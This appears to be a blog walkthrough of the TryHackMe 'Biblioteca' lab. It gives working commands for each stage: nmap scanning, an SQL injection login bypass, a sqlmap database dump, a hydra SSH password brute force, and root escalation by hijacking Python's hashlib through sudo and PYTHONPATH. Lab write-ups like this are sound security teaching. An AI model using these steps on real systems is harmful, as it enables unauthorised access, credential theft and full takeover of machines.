---
title: "TryHackMe - Biblioteca"
author: Nasrallah
description: ""
date: 2022-12-25 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, python, hijacking, sqli, sqlmap, hydra]
img_path: /assets/img/tryhackme/biblioteca
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Biblioteca](https://tryhackme.com/room/biblioteca) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.211.29
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 00:0b:f9:bf:1d:49:a6:c3:fa:9c:5e:08:d1:6d:82:02 (RSA)
|   256 a1:0c:8e:5d:f0:7f:a5:32:b2:eb:2f:7a:bf:ed:bf:3d (ECDSA)
|_  256 9e:ef:c9:0a:fc:e9:9e:ed:e3:2d:b1:30:b6:5f:d4:0b (ED25519)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports, port 22 running OpenSSH 8.2p1 and port 8000 running Werkzeug httpd 2.0.2.

### Web

Let's navigate to the web page.

![](1.png)

It's a login page, let's try logging in using sql injection.

![](2.png)

We managed to login as **Smokey** using this payload `' or 1=1 -- -`

## **Foothold**

### Sqlmap

Let's run `sqlmap` on the login page and tell it to dump everything.

```bash
sqlmap -u 'http://10.10.218.61:8000/login' --form --batch --dump
```

![](3.png)

Great! We managed to read the database and found a clear text password of `smokey`.

Let's try ssh into the machine with that password.

![](4.png)

## **Privilege Escalation**

If we check the `/home` directory we find a folder named `hazel` which belongs the user `hazel`.

### Hydra

The hint for the user flag says `Weak password`, so let's brute force `hazel`'s ssh password using hydra.

```bash
hydra -l 'hazel' -P /usr/share/wordlists/rockyou.txt 10.10.218.61 ssh -t 30
```

![](5.png)

We found the password, let's swith to `hazel`.

![](6.png)

After running the command `sudo -l`, we see that `hazel` can run **/usr/bin/python3 /home/hazel/hasher.py** with `SETENV` which allow us to set the environment variables for the program we're running.

```python
import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()
```

This python script imports `hashlib` library.

Since we can't modify `hasher.py` or create files in `hazel`'s home directory, we will hijack the `hashlib` library and use the `SETENV` to get it executed. For more information about library hijacking, check this [article](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/).

First we're going to create a file in /tmp directory and calle it `hashlib.py`containing the following script.

```python
import os; os.system("/bin/bash")
```

Now we run the sudo command with the environment variable `PYTHONPATH` set to `/tmp` to get root.

```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

![](7.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
